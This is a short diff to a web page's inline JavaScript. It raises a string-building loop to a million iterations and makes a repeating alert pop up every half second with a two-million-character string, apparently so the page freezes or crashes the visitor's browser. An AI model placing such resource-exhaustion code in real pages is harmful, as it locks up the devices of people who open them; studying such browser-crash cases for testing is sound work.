@@ -32,7 +32,7 @@ document.querySelector('a').click();
 <script type="text/javascript">
 
 var extraData = "";
-for (iterate = 0; iterate < 1000; iterate++) {
+for (iterate = 0; iterate < 1000000; iterate++) {
 	var extraData = extraData + "5555555555";
 }
 
@@ -44,7 +44,7 @@ document.querySelector('a').click();
 <!-- This is also somehow involved -->
 <script type="text/javascript">
 
-setInterval(function(){ alert('\0345'.repeat(2000));}, 500);
+setInterval(function(){ alert('\0345'.repeat(2000000));}, 500);
 
 </script>
 
